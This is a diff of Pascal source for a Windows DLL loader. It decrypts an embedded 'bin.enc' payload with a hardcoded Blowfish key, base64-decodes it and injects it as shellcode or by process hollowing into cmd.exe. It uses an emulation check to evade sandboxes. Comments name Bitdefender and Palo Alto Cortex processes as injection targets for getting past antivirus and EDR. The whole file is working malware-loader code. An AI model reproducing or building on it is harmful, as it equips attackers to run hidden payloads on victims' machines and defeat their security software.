@@ -33,77 +33,104 @@ SOFTWARE.
 {$mode objfpc}{$H+}
 
 uses
-  Classes,windows,blowfish,runner,SysUtils,base64,process, strutils;
+  Classes, windows, blowfish, runner, SysUtils,base64, shell_loader,
+  strutils, syscalls;
+
+
+const
+ // key for decryption
+ MASTER_KEY:array[0..9] of BYTE = ($7a,$75,$78,$69,$61,$6d,$68,$65,$72,$61);
 
 
 
-function Base64ToStream(const ABase64:string; AOutStream: TMemoryStream; const AStrict: Boolean=false):Boolean;
+ function Base64ToStream(var ABase64:widestring; const AOutStream: TMemoryStream; const AStrict: Boolean=false):Boolean;
+ var
+   InStream: TStringStream;
+   Decoder: TBase64DecodingStream;
+ begin
+
+
+ Result := False;
+ InStream := TStringStream.Create(ABase64);
+   try
+     if AStrict then
+       Decoder := TBase64DecodingStream.Create(InStream, bdmStrict)
+     else
+       Decoder := TBase64DecodingStream.Create(InStream, bdmMIME);
+     try
+       AOutStream.Seek(0,sofrombeginning);
+
+        AOutStream.CopyFrom(decoder,decoder.Size);
+
+        Result := True;
+     finally
+       Decoder.Free;
+     end;
+   finally
+     InStream.Free;
+   end;
+ end;
+
+procedure SH_Decryptor;
 var
-  InStream: TStringStream;
-  Decoder: TBase64DecodingStream;
-  temp :string;
-    BA_IN, BA_OUT: array of Byte;
+  de :TBlowFishDeCryptStream;
+  s2: TStringStream;
+  key:rawbytestring;
+
+  AMemStr,MS: TMemoryStream;
+  AStrStr: TStringStream;
+  list_c : Tstringlist;
+
+  outp,l_file,in_log:string;
+  temp: widestring;
 begin
-  setlength(BA_IN,20);
+
+l_file := getcurrentdir+'\bin.enc';
+
+  AMemStr := TMemoryStream.Create;
+  MS := Tmemorystream.Create;
+  list_c := Tstringlist.Create;
 
 
-  // adding these as optional in case you wanna do some random nops into the memory
 
-  BA_IN[0]:= $90;
-  BA_IN[1]:= $90;
-  BA_IN[2]:= $90;
-  BA_IN[3]:= $90;
-  BA_IN[4]:= $90;
-  BA_IN[5]:= $90;
-  BA_IN[6]:= $90;
-  BA_IN[7]:= $90;
-  BA_IN[8]:= $90;
-  BA_IN[9]:= $90;
-  BA_IN[10]:= $90;
-  BA_IN[11]:= $90;
-  BA_IN[12]:= $90;
-  BA_IN[13]:= $90;
-  BA_IN[14]:= $90;
-  BA_IN[15]:= $90;
-  BA_IN[16]:= $90;
-  BA_IN[17]:= $90;
-  BA_IN[18]:= $90;
-  BA_IN[19]:= $90;
+  Amemstr.LoadFromFile(l_file);
+  AmemStr.Write(outp[1],length(outp) * sizeof(outp[1]));
+ AMemStr.Position := 0;
 
-  Result := False;
-  InStream := TStringStream.Create(ABase64);
+  //copy MemoryStream to StringStream
+  AStrStr := TStringStream.Create('');
 
-  try
-    if AStrict then
-      Decoder := TBase64DecodingStream.Create(InStream, bdmStrict)
-    else
-      Decoder := TBase64DecodingStream.Create(InStream, bdmMIME);
-    try
-      AOutStream.Seek(0,sofrombeginning);
-    //   AoutStream.WriteBuffer(BA_IN,20);
-     //  AoutStream.Position:=0;
-       AOutStream.CopyFrom(decoder,decoder.Size);
-       Result := True;
-    finally
-      Decoder.Free;
-    end;
-  finally
-    InStream.Free;
+  AStrStr.Size := AMemStr.Size;
+  AStrStr.CopyFrom(AMemStr, AMemStr.Size);
+  AStrStr.Position := 0;
+
+  key := TEncoding.UTF8.GetString(MASTER_KEY);
+
+
+  s2 := TStringStream.Create(AStrStr.DataString);
+  de := TBlowFishDeCryptStream.Create(key,s2);
+  AStrStr.Free;
+  SetLength(temp,s2.Size);
+  de.Read(temp[1],s2.Size);
+
+
+
+  Base64ToStream(temp,MS,false);
+  Ms.Position:=0;
+  list_c.LoadFromStream(MS);
+
+  in_log := convertshellcode(list_c.text);
+
+   inject_shell(in_log);
+
+
+  Amemstr.Free;
+  list_c.Free;
+
   end;
-end;
 
-function bintostr(const bin: array of byte): string;
-const HexSymbols = '0123456789ABCDEF';
-var i: integer;
-begin
-  SetLength(Result, 2*Length(bin));
-  for i :=  0 to Length(bin)-1 do begin
-    Result[1 + 2*i + 0] := HexSymbols[1 + bin[i] shr 4];
-    Result[1 + 2*i + 1] := HexSymbols[1 + bin[i] and $0F];
-  end;
-end;
 
-function blowfish_decryption(input:string):string;
+function bin_decryptor(input:string):widestring;
 var
   de :TBlowFishDeCryptStream;
   str_strm: TStringStream;
@@ -111,27 +138,12 @@ var
   AMemStr, AMemStr2: TMemoryStream;
   AStrStr: TStringStream;
   processhandle:thandle;
-  BA_IN: array of Byte;
-  outp,url,temp:string;
-
+  outp,url:string;
+   temp:widestring;
 
 begin
 
-//7a 75 78 69 61 6d 68 65 72 65
-   SetLength(BA_IN, 10);     //string convert into bytes in order avoid storing key as string
-   BA_IN[0]:= $7a;
-   BA_IN[1]:= $75;
-   BA_IN[2]:= $78;
-   BA_IN[3]:= $69;
-   BA_IN[4]:= $61;
-   BA_IN[5]:= $6d;
-   BA_IN[6]:= $68;
-   BA_IN[7]:= $65;
-   BA_IN[8]:= $72;
-   BA_IN[9]:= $65;
-
-
-  url := getcurrentdir+'\bin.enc';   // place the encrypted binary in same folder
+url := getcurrentdir+'\bin.enc';   // place the encrypted binary in same folder
 
   AMemStr := TMemoryStream.Create;
  AMemStr.LoadFromFile(url);
@@ -144,57 +156,67 @@ begin
   AStrStr.CopyFrom(AMemStr, AMemStr.Size);
   AStrStr.Position := 0;
 
-   key := TEncoding.UTF8.GetString(BA_IN); // getting string value of array of bytes.
+  key := TEncoding.UTF8.GetString(MASTER_KEY); // getting string value of array of bytes.
 
 
   str_strm := TStringStream.Create(AStrStr.DataString);
   de := TBlowFishDeCryptStream.Create(key,str_strm);
   AStrStr.Free;
   SetLength(temp,str_strm.Size);
+
   de.Read(temp[1],str_strm.Size);
+  sleep(1);
   AMemStr2 := TMemoryStream.Create;
   Base64tostream(temp,Amemstr2,false);
 
-   fork_x64(input,runner.TByteArray(AMemStr2.memory),processhandle);
-   AMemStr2.Free;
+  fork_P_x64(input,runner.TByteArray(AMemStr2.memory),processhandle);
+
+  AMemStr2.Free;
   Amemstr.Free;
 
   end;
 
-procedure dec; stdcall;
+procedure start; stdcall;
 
 begin
- if isEmulated = true  then
+
+  {
+   for bitdefender C:\Program Files\Bitdefender\Bitdefender Security\bdservicehost.exe
+   for palo-alto C:\Program Files\Palo Alto Networks\Traps\CyveraConsole.exe
+
+  }
+if isEmulated = true  then
   exit
   else
- // normal mode, cmd process
-blowfish_decryption('c:\\windows\\system32\\cmd.exe');
+    bin_decryptor('c:\\windows\\system32\\cmd.exe');
 
 end;
 
-procedure stealth; stdcall;
+
+procedure sh; stdcall;
+
 begin
-      if isEmulated = true  then
+if isEmulated = true  then
   exit
   else
- blowfish_decryption('C:\Program Files\Palo Alto Networks\Traps\CyveraConsole.exe');
+SH_Decryptor;
+
 end;
 
-procedure bit; stdcall; 
-begin
-blowfish_decryption('C:\Program Files\Bitdefender\Bitdefender Security\bdservicehost.exe');
-end; 
+exports start,
+        sh;
 
 
-exports dec,
-        bit,
-        stealth;
 begin
+  {
+  is emulated technique is still rock =:>
+  }
+
   if isEmulated = true  then
-  exit
-  else
-  {up to you }
- // here replace the path to any XDR solution or AV,below is default path of Cortex
- // blowfish_decryption('C:\Program Files\Palo Alto Networks\Traps\CyveraConsole.exe');
+    exit
+    else
+    //  sleep(10000);
+      exit;
+
 end.
 
